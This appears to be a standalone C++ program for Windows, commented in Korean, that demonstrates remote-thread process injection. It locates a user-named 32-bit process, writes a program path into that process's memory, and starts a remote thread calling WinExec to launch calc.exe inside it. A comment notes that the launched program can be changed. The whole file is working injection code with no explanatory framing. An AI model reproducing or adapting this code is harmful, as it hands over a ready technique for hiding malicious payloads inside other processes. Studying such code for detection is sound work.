#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

DWORD GetProcessID(const wchar_t* procName) {
    DWORD pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(pe);
        if (Process32First(hSnap, &pe)) {
            do {
                if (!_wcsicmp(pe.szExeFile, procName)) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pe));
        }
    }
    CloseHandle(hSnap);
    return pid;
}

// 32비트 프로세스 여부 확인 함수
// WOW64(Windows-on-Windows 64bit) == TRUE인 경우 32비트 프로세스
bool IsProcess32Bit(HANDLE hProcess) {
    BOOL isWow64 = FALSE;
    typedef BOOL(WINAPI* LPFN_ISWOW64PROCESS)(HANDLE, PBOOL);
    LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(GetModuleHandle(L"kernel32"), "IsWow64Process");

    if (fnIsWow64Process) {
        if (!fnIsWow64Process(hProcess, &isWow64)) {
            std::cerr << "IsWow64Process 호출 실패" << std::endl;
            return false;
        }
    }
    return isWow64;
}

int main() {
    wchar_t targetProcess[256];

    std::wcout << L"타겟 프로세스 이름을 입력하세요 (예: notepad.exe): ";
    std::wcin.getline(targetProcess, 256);

    DWORD pid = GetProcessID(targetProcess);
    if (pid == 0) {
        std::wcout << L"프로세스를 찾을 수 없습니다: " << targetProcess << std::endl;
        return 1;
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "프로세스 열기 실패" << std::endl;
        return 1;
    }

    // 32비트 프로세스인지 확인
    if (!IsProcess32Bit(hProcess)) {
        std::cerr << "타겟 프로세스는 64비트 프로세스입니다. 32비트 프로세스만 지원됩니다." << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    std::cout << "타겟 프로세스가 32비트임을 확인!" << std::endl;

    // 실행할 프로그램 (calc.exe)
    // 상황에 따라 변경 가능
    const char* exePath = "C:\\Windows\\System32\\calc.exe";

    // 타겟 프로세스 메모리에 문자열을 저장할 공간 할당
    LPVOID pRemoteMem = VirtualAllocEx(hProcess, nullptr, strlen(exePath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (!pRemoteMem) {
        std::cerr << "메모리 할당 실패" << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    // 메모리에 실행할 exe 경로 쓰기
    if (!WriteProcessMemory(hProcess, pRemoteMem, exePath, strlen(exePath) + 1, nullptr)) {
        std::cerr << "메모리 쓰기 실패" << std::endl;
        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // `WinExec` 또는 `CreateProcess`를 실행하는 원격 스레드 생성
    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0,
        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "WinExec"),
        pRemoteMem, 0, nullptr);

    if (!hThread) {
        std::cerr << "스레드 생성 실패" << std::endl;
        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    std::cout << "Thread Injection 성공! (calc.exe 실행됨)" << std::endl;

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}